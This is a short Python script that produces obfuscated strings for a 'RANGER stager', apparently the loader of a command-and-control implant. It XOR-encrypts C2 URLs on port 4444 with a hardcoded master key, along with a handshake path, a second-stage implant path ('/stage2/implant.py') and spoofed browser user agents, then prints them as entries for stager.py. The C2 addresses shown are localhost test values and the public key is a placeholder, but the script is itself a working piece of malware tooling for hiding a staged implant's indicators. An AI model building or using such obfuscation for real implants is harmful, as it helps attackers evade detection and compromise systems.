#!/usr/bin/env python3
"""
Generate encrypted strings for RANGER stager
"""

import base64
import hashlib
import os

_MASTER_KEY = b'R0gu3R4NG3R_M45t3r_K3y_2026'

def _encrypt_string(plain: str) -> str:
    """Encrypt a string using per‑nonce derived key."""
    nonce = os.urandom(16)
    key = hashlib.sha256(_MASTER_KEY + nonce).digest()
    ciphertext = bytes(ord(plain[i]) ^ key[i % len(key)] for i in range(len(plain)))
    return base64.b64encode(nonce + ciphertext).decode()

# Real values for testing
c2_urls = [
    'http://localhost:4444',
    'http://127.0.0.1:4444'
]
handshake_path = '/handshake'
stage2_path = '/stage2/implant.py'
user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36'
]

print("Encrypted strings for stager.py:")
print()
print("C2_URLS = [")
for url in c2_urls:
    print(f"    d('{_encrypt_string(url)}'),")
print("]")
print()
print(f"HANDSHAKE_PATH = d('{_encrypt_string(handshake_path)}')")
print()
print(f"STAGE2_PATH = d('{_encrypt_string(stage2_path)}')")
print()
print("USER_AGENTS = [")
for ua in user_agents:
    print(f"    d('{_encrypt_string(ua)}'),")
print("]")
print()
print("PUBLIC_KEY_B64 = d('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=')  # Placeholder")